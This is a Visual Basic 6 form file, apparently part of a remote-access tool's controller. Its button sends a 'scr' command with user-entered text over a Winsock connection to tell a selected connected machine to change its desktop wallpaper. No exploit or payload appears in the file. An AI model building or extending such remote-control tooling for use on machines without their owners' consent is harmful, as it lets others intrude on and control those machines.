VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Begin VB.Form fondo 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Cambiar fondo de pantalla"
   ClientHeight    =   945
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   3480
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   945
   ScaleWidth      =   3480
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   1680
      OleObjectBlob   =   "fondo.frx":0000
      Top             =   0
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Cerrar"
      Height          =   255
      Left            =   2400
      TabIndex        =   2
      Top             =   120
      Width           =   975
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Cambiar"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   975
   End
   Begin VB.TextBox Text7 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   3255
   End
End
Attribute VB_Name = "fondo"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim vIndex As Variant
Dim Index_n As Integer

Private Sub Command1_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "scr" & Text7.Text
    Text7 = ""
    Text7.SetFocus
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

Skin1.LoadSkin App.path & "\sk\skin.skn"
Skin1.ApplySkin fondo.hwnd
End Sub
